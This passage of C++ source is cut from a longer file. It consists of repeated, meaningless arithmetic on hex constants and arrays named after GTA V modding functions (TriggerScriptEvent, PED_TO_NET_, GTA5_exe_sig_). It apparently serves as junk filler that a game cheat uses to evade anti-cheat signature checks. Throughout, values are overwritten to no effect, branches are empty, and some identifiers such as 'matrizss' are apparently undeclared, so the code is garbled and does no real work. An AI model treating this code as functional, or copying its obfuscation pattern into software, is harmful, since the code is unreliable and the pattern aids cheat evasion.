					TriggerScriptEvent[4] = TriggerScriptEvent[1];
				}
				a2 = (TriggerScriptEvent[4]) / (2 * TriggerScriptEvent[2]);
				a1 = (TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
				TriggerScriptEvent[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (TriggerScriptEvent[2] * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
				NETWORK_GET_ENTITY_IS_LOCAL_ = 0xB2 * 2;
				a = 0.0f;
				a1 = (TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
				b = 0.0f;
				TriggerScriptEvent[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
				TriggerScriptEvent[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
				TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (TriggerScriptEvent[1] + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] + 0xA12;
				TriggerScriptEvent[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1];
				TriggerScriptEvent[4] = TriggerScriptEvent[1];
				TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
				TriggerScriptEvent[1] = (0xB2 + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
				TriggerScriptEvent[1] = (0xA12 * 0xA) + TriggerScriptEvent[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + TriggerScriptEvent[1];
				TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1];
				a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
				a2 = (TriggerScriptEvent[4] + (2)) / (2 * TriggerScriptEvent[2]);
				TriggerScriptEvent[1] = (0xB2 * 0xA) + (TriggerScriptEvent[2] * 0xA) * 0xBB;
				TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
				TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
				if (TriggerScriptEvent[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
				{
				}
				else
					a1 = (TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
				a2 = (TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			}
			float LerFloat(std::string app, std::string key)
			{
				if (offset > aaaaaa)
				{
					matriz[2] = (ponteiro * 0xA) + (0xB1231 * 0xA) - offset / (ponteiro * 0xA) + (0xB1231 * 0xA) - offset;
					matriz[3] = (0xB1231 * 0xA) - (ponteiro * 0xA) + (0xB1231 * 0xA) - matriz[2] + aaaaaa;
					matriz[4] = (0xA12 * 0xA) + matrizss[2] * (ponteiro * 0xA) + (0xB1231 * 0xA) - offset;
					matriz[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
					matriz[7] = (0xB1231 * 0xA) + matriz[2];
					a1 = (-matriz[3] + (65)) / (2 * matriz[2]);
					a2 = (-matriz[4] - (22)) / (2 * matriz[2]);
				}
				else
				{
					offset = (ponteiro * 0xA) + (0xB1231 * 0xA) - offset / (matriz[2] * 0xA) + (ponteiro * 0xA) - offset;
					offset = (ponteiro * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - offset + aaaaaa;
					offset = (0xA12 * 0xA) + matriz[2] * (ponteiro * 0xA) + (ponteiro * 0xA) - offset;
					offset = (0xB1231 * 0xA12) + (ponteiro * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - ponteiro + 0xA12;
					offset = (ponteiro * 0xA) + (matriz[2] * 0xA) - 0xBB;
					offset = (0xB1231 * 0xA) + 0xA12;
					a1 = (-matriz[3] + (4)) / (2 * matriz[2]);
					a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
				}
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-matriz[3] + (5)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-matriz[3] + (2)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (2)) / (2 * matriz[2]);
				if (matriz[4] > 50.0f)
				{
					matriz[4] = matriz[1];
				}
				a2 = (matriz[4]) / (2 * matriz[2]);
				a1 = (matriz[3] + (2)) / (2 * matriz[2]);
				offset = (ponteiro * 0xA) + (0xB1231 * 0xA) / (matriz[2] * 0xA) + (ponteiro * 0xA) - offset;
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (matriz[3] + (5)) / (2 * matriz[2]);
				aaaaaa = ponteiro * 2;
				a = 0.0f;
				a1 = (matriz[3] + (4)) / (2 * matriz[2]);
				b = 0.0f;
				matriz[3] = (0xB1231 * 0xA) + (ponteiro * 0xA) + (0xB1231 * 0xA) + matriz[2] + aaaaaa;
				a2 = (matriz[4] + (3)) / (2 * matriz[2]);
				offset = (0xB1231 * 0xA12) + (ponteiro + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + ponteiro + 0xA12;
				matriz[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
				matriz[2] = (ponteiro * 0xA) + (0xB1231 * 0xA) + offset / (ponteiro * 0xA) + (0xB1231 * 0xA) + offset;
				matriz[4] = matriz[1];
				matriz[7] = (0xB1231 * 0xA) + matriz[2];
				offset = (ponteiro + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + offset + aaaaaa;
				offset = (0xA12 * 0xA) + matriz[2] * (ponteiro * 0xA) + (ponteiro * 0xA) + offset;
				matriz[4] = (0xA12 * 0xA) + matrizss[2] * (ponteiro * 0xA) + (0xB1231 * 0xA) + offset;
				a2 = (matriz[4] + (3)) / (2 * matriz[2]);
				a2 = (matriz[4] + (2)) / (2 * matriz[2]);
				offset = (ponteiro * 0xA) + (matriz[2] * 0xA) * 0xBB;
				offset = (0xB1231 * 0xA) + 0xA12;
				offset = (0xB1231 * 0xA) + 0xA12;
				if (offset > aaaaaa)
				{
				}
				else
					a1 = (matriz[3] + (65)) / (2 * matriz[2]);
				a2 = (matriz[4] - (3)) / (2 * matriz[2]);

				if (matriz[1] > aaaaaa)
				{
					matriz[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1];
					matriz[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[2] + aaaaaa;
					matriz[4] = (0xA12 * 0xA) + matrizss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1];
					matriz[5] = (0xB1231 * 0xA12) + (matriz[1] * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - matriz[1] + 0xA12;
					matriz[7] = (0xB1231 * 0xA) + matriz[2];
					a1 = (-matriz[3] + (65)) / (2 * matriz[2]);
					a2 = (-matriz[4] - (22)) / (2 * matriz[2]);
				}
				else
				{
					matriz[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1] / (matriz[2] * 0xA) + (0xB2 * 0xA) - matriz[1];
					matriz[1] = (0xB2 * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - matriz[1] + aaaaaa;
					matriz[1] = (0xA12 * 0xA) + matriz[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - matriz[1];
					matriz[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
					matriz[1] = (0xB2 * 0xA) + (matriz[2] * 0xA) - 0xBB;
					matriz[1] = (0xB1231 * 0xA) + 0xA12;
					a1 = (-matriz[3] + (4)) / (2 * matriz[2]);
					a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
				}
				matriz[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-matriz[3] + (5)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
				matriz[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-matriz[3] + (2)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (2)) / (2 * matriz[2]);
				a = 0.0f;
				b = 0.0f;
				if (matriz[4] > 50.0f)
				{
					matriz[4] = matriz[1];
				}
				a2 = (matriz[4]) / (2 * matriz[2]);
				a1 = (matriz[3] + (2)) / (2 * matriz[2]);
				matriz[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (matriz[2] * 0xA) + (0xB2 * 0xA) - matriz[1];
				matriz[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (matriz[3] + (5)) / (2 * matriz[2]);
				aaaaaa = 0xB2 * 2;
				a = 0.0f;
				a1 = (matriz[3] + (4)) / (2 * matriz[2]);
				b = 0.0f;
				matriz[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[2] + aaaaaa;
				a2 = (matriz[4] + (3)) / (2 * matriz[2]);
				matriz[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
				matriz[5] = (0xB1231 * 0xA12) + (matriz[1] + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + matriz[1] + 0xA12;
				matriz[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1];
				matriz[4] = matriz[1];
				matriz[7] = (0xB1231 * 0xA) + matriz[2];
				matriz[1] = (0xB2 + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + matriz[1] + aaaaaa;
				matriz[1] = (0xA12 * 0xA) + matriz[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + matriz[1];
				matriz[4] = (0xA12 * 0xA) + matrizss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1];
				a2 = (matriz[4] + (3)) / (2 * matriz[2]);
				a2 = (matriz[4] + (2)) / (2 * matriz[2]);
				matriz[1] = (0xB2 * 0xA) + (matriz[2] * 0xA) * 0xBB;
				matriz[1] = (0xB1231 * 0xA) + 0xA12;
				matriz[1] = (0xB1231 * 0xA) + 0xA12;
				if (matriz[1] > aaaaaa)
				{
				}
				else
					a1 = (matriz[3] + (65)) / (2 * matriz[2]);
				a2 = (matriz[4] - (3)) / (2 * matriz[2]);

				if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
				{
					GTA5_exe_sig_[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
					GTA5_exe_sig_[3] = (0xB1231 * 0xA) - (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
					GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
					GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
					GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
					a1 = (-GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
					a2 = (-GTA5_exe_sig_[4] - (22)) / (2 * GTA5_exe_sig_[2]);
				}
				else
				{
					offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (GTA5_exe_sig_[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
					offset = (PED_TO_NET_ * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - offset + NETWORK_GET_ENTITY_IS_LOCAL_;
					offset = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) - offset;
					offset = (0xB1231 * 0xA12) + (PED_TO_NET_ * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - PED_TO_NET_ + 0xA12;
					offset = (PED_TO_NET_ * 0xA) + (GTA5_exe_sig_[2] * 0xA) - 0xBB;
					offset = (0xB1231 * 0xA) + 0xA12;
					a1 = (-GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
					a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
				}
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (2)) / (2 * GTA5_exe_sig_[2]);
				if (GTA5_exe_sig_[4] > 50.0f)
				{
					GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
				}
				a2 = (GTA5_exe_sig_[4]) / (2 * GTA5_exe_sig_[2]);
				a1 = (GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
				offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) / (GTA5_exe_sig_[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
				NETWORK_GET_ENTITY_IS_LOCAL_ = PED_TO_NET_ * 2;
				a = 0.0f;
				a1 = (GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
				b = 0.0f;
				GTA5_exe_sig_[3] = (0xB1231 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
				offset = (0xB1231 * 0xA12) + (PED_TO_NET_ + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + PED_TO_NET_ + 0xA12;
				GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
				GTA5_exe_sig_[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
				GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
				GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
				offset = (PED_TO_NET_ + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + offset + NETWORK_GET_ENTITY_IS_LOCAL_;
				offset = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) + offset;
				GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
				a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
				a2 = (GTA5_exe_sig_[4] + (2)) / (2 * GTA5_exe_sig_[2]);
				offset = (PED_TO_NET_ * 0xA) + (GTA5_exe_sig_[2] * 0xA) * 0xBB;
				offset = (0xB1231 * 0xA) + 0xA12;
				offset = (0xB1231 * 0xA) + 0xA12;
				if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
				{
				}
				else
					a1 = (GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
				a2 = (GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);

				if (GTA5_exe_sig_[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
				{
					GTA5_exe_sig_[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1];
					GTA5_exe_sig_[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
					GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1];
					GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (GTA5_exe_sig_[1] * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] + 0xA12;
					GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
					a1 = (-GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
					a2 = (-GTA5_exe_sig_[4] - (22)) / (2 * GTA5_exe_sig_[2]);
				}
				else
				{
					GTA5_exe_sig_[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] / (GTA5_exe_sig_[2] * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
					GTA5_exe_sig_[1] = (0xB2 * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
					GTA5_exe_sig_[1] = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
					GTA5_exe_sig_[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
					GTA5_exe_sig_[1] = (0xB2 * 0xA) + (GTA5_exe_sig_[2] * 0xA) - 0xBB;
					GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
					a1 = (-GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
					a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
				}
				GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
				GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (2)) / (2 * GTA5_exe_sig_[2]);
				a = 0.0f;
				b = 0.0f;
				if (GTA5_exe_sig_[4] > 50.0f)
				{
					GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
				}
				a2 = (GTA5_exe_sig_[4]) / (2 * GTA5_exe_sig_[2]);
				a1 = (GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
				GTA5_exe_sig_[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (GTA5_exe_sig_[2] * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
				NETWORK_GET_ENTITY_IS_LOCAL_ = 0xB2 * 2;
				a = 0.0f;
				a1 = (GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
				b = 0.0f;
				GTA5_exe_sig_[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
				GTA5_exe_sig_[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
				GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (GTA5_exe_sig_[1] + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] + 0xA12;
				GTA5_exe_sig_[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1];
				GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
				GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
				GTA5_exe_sig_[1] = (0xB2 + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
				GTA5_exe_sig_[1] = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + GTA5_exe_sig_[1];
				GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1];
				a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
				a2 = (GTA5_exe_sig_[4] + (2)) / (2 * GTA5_exe_sig_[2]);
				GTA5_exe_sig_[1] = (0xB2 * 0xA) + (GTA5_exe_sig_[2] * 0xA) * 0xBB;
				GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
				GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
				if (GTA5_exe_sig_[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
				{
				}
				else
					a1 = (GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
				a2 = (GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);


				if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
				{
					TriggerScriptEvent[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
					TriggerScriptEvent[3] = (0xB1231 * 0xA) - (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
					TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
					TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
					TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
					a1 = (-TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
					a2 = (-TriggerScriptEvent[4] - (22)) / (2 * TriggerScriptEvent[2]);
				}
				else
				{
					offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (TriggerScriptEvent[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
					offset = (PED_TO_NET_ * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - offset + NETWORK_GET_ENTITY_IS_LOCAL_;
					offset = (0xA12 * 0xA) + TriggerScriptEvent[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) - offset;
					offset = (0xB1231 * 0xA12) + (PED_TO_NET_ * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - PED_TO_NET_ + 0xA12;
					offset = (PED_TO_NET_ * 0xA) + (TriggerScriptEvent[2] * 0xA) - 0xBB;
					offset = (0xB1231 * 0xA) + 0xA12;
					a1 = (-TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
					a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
				}
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (5) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (2)) / (2 * TriggerScriptEvent[2]);
				if (TriggerScriptEvent[4] > 50.0f)
				{
					TriggerScriptEvent[4] = TriggerScriptEvent[1];
				}
				a2 = (TriggerScriptEvent[4]) / (2 * TriggerScriptEvent[2]);
				a1 = (TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
				offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) / (TriggerScriptEvent[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
				NETWORK_GET_ENTITY_IS_LOCAL_ = PED_TO_NET_ * 2;
				a = 0.0f;
				a1 = (TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
				b = 0.0f;
				TriggerScriptEvent[3] = (0xB1231 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
				offset = (0xB1231 * 0xA12) + (PED_TO_NET_ + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + PED_TO_NET_ + 0xA12;
				TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
				TriggerScriptEvent[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
				TriggerScriptEvent[4] = TriggerScriptEvent[1];
				TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
				offset = (PED_TO_NET_ + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + offset + NETWORK_GET_ENTITY_IS_LOCAL_;
				offset = (0xA12 * 0xA) + TriggerScriptEvent[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) + offset;
				TriggerScriptEvent[4] = (0xA12 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
				a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
				a2 = (TriggerScriptEvent[4] + (2)) / (2 * TriggerScriptEvent[2]);
				offset = (PED_TO_NET_ * 0xA) + (TriggerScriptEvent[2] * 0xA) * 0xBB;
				offset = (0xB1231 * 0xA) + 0xA12;
				offset = (0xB1231 * 0xA) + 0xA12;
				if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
				{
				}
				else
					a1 = (TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
				a2 = (TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);

				if (TriggerScriptEvent[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
				{
					TriggerScriptEvent[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1];
					TriggerScriptEvent[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
					TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1];
					TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (TriggerScriptEvent[1] * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] + 0xA12;
					TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
					a1 = (-TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
					a2 = (-TriggerScriptEvent[4] - (22)) / (2 * TriggerScriptEvent[2]);
				}
				else
				{
					TriggerScriptEvent[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] / (TriggerScriptEvent[2] * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
					TriggerScriptEvent[1] = (0xB2 * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
					TriggerScriptEvent[1] = (0xA12 * 0xA) + TriggerScriptEvent[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
